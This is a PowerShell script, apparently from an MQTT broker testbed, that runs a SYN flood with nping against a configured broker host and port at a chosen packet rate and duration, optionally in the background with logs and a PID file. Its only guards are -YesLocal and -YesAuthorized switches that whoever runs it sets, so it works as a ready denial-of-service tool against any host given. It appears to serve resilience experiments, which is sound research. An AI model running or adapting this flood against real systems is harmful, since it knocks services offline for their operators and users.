param(
    [ValidateSet("normal", "syn_flood", "syn_flood_rate_limit")]
    [string]$Scenario,
    [string]$RunId,
    [string]$BrokerHost,
    [int]$MqttPort,
    [int]$Duration,
    [int]$AttackRate,
    [switch]$YesLocal,
    [switch]$YesAuthorized,
    [switch]$Background
)

. "$PSScriptRoot\common.ps1"
Import-ProjectConfig

if ($Scenario) {
    [Environment]::SetEnvironmentVariable("SCENARIO", $Scenario, "Process")
    if (-not $RunId) {
        $RunId = "$(Get-Date -Format 'yyyyMMdd_HHmmss')_$Scenario"
    }
}
if ($RunId) {
    [Environment]::SetEnvironmentVariable("RUN_ID", $RunId, "Process")
}
if ($BrokerHost) {
    [Environment]::SetEnvironmentVariable("BROKER_HOST", $BrokerHost, "Process")
}
if ($MqttPort) {
    [Environment]::SetEnvironmentVariable("MQTT_PORT", "$MqttPort", "Process")
}
if ($Duration) {
    [Environment]::SetEnvironmentVariable("EXPERIMENT_DURATION", "$Duration", "Process")
}
if ($AttackRate) {
    [Environment]::SetEnvironmentVariable("ATTACK_RATE", "$AttackRate", "Process")
}

if ($env:SCENARIO -eq "normal") {
    Write-Host "[OK] Skenario normal tidak menjalankan serangan."
    exit 0
}

if (-not $YesLocal) {
    throw "SYN flood hanya boleh dijalankan pada testbed lokal/izin. Tambahkan -YesLocal jika target adalah broker uji sendiri."
}

if ($env:DEPLOYMENT_MODE -ne "local" -and -not $YesAuthorized) {
    throw "DEPLOYMENT_MODE=$($env:DEPLOYMENT_MODE) membutuhkan izin tertulis. Tambahkan -YesAuthorized hanya jika sudah ada izin."
}

$nping = Get-Command nping -ErrorAction SilentlyContinue
if (-not $nping) {
    throw "nping tidak ditemukan. Install Nmap for Windows dan Npcap, lalu jalankan PowerShell sebagai Administrator."
}

$runDirectory = Get-RunDirectory
New-Item -ItemType Directory -Force -Path $runDirectory | Out-Null
$attackLog = Join-Path $runDirectory "attack.log"
$attackErr = Join-Path $runDirectory "attack.err.log"
$pidFile = Join-Path $runDirectory "attack.pid"

$durationSeconds = [int]$env:EXPERIMENT_DURATION
$rate = [int]$env:ATTACK_RATE
$count = [Math]::Max(1, $durationSeconds * $rate)

Write-Host "[INFO] Windows SYN flood generator"
Write-Host "[INFO] target   : $($env:BROKER_HOST):$($env:MQTT_PORT)"
Write-Host "[INFO] duration : $durationSeconds detik"
Write-Host "[INFO] rate     : $rate paket/detik"
Write-Host "[INFO] count    : $count paket"
Write-Host "[INFO] output   : $attackLog"

$arguments = @(
    "--tcp",
    "--flags", "syn",
    "-p", $env:MQTT_PORT,
    "--rate", "$rate",
    "-c", "$count",
    "--quiet",
    $env:BROKER_HOST
)

if ($Background) {
    $process = Start-Process -FilePath $nping.Source -ArgumentList $arguments -RedirectStandardOutput $attackLog -RedirectStandardError $attackErr -PassThru
    Set-Content -Path $pidFile -Value $process.Id
    Write-Host "[OK] Attacker berjalan di background."
    Write-Host "[INFO] PID      : $($process.Id)"
    Write-Host "[INFO] stdout   : $attackLog"
    Write-Host "[INFO] stderr   : $attackErr"
    Write-Host "[INFO] Setelah ini langsung jalankan run_client.ps1 dengan RunId yang sama."
    exit 0
}

& $nping.Source @arguments 2>&1 | Tee-Object -FilePath $attackLog
if ($LASTEXITCODE -ne 0) {
    throw "nping gagal dengan kode $LASTEXITCODE. Cek $attackLog."
}

Write-Host "[OK] Serangan uji selesai. Log tersimpan di:"
Write-Host "     $attackLog"
